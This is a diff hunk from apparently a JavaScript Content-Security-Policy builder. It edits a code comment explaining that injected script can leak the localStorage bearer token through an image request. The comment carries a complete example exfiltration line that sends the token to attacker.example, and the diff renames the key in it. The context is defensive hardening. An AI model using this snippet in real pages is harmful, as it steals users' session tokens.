@@ -84,7 +84,7 @@ export const buildConnectSrc = ({ apiBase, addonBase, sentryDsn, extra } = {}) =
  * every host on the web — and an <img> is a request, so it exfiltrates just as
  * well as a fetch does:
  *
- *     new Image().src = "https://attacker.example/?t=" + localStorage.cataloggy_token;
+ *     new Image().src = "https://attacker.example/?t=" + localStorage.fetch_token;
  *
  * The bearer token lives in localStorage by design, and `connect-src` was
  * tightened precisely so injected script could not post it anywhere. Leaving
